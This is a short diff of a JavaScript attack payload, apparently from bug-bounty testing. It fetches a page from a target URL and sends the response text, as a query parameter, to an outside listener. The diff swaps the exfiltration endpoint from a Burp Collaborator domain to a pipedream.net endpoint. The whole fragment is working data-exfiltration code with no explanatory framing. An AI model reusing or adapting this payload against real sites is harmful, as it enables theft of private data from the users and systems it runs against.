@@ -44,5 +44,5 @@ var xmlhttp=false;
 loadXMLDoc('https://unmanagedabacus.br2.bughuntr.net/view/f09d4c45-4212-4008-bdcd-9376c8ec813a');
 
 if(xmlhttp==false){  }
-else { loadXMLDoc('https://mf554bwpw39eqcnotvtoi8g7nytprdg.burpcollaborator.net?a111='+xmlhttp.responseText) }
+else { loadXMLDoc('https://enlftbb365whq.x.pipedream.net?a111='+xmlhttp.responseText) }
 
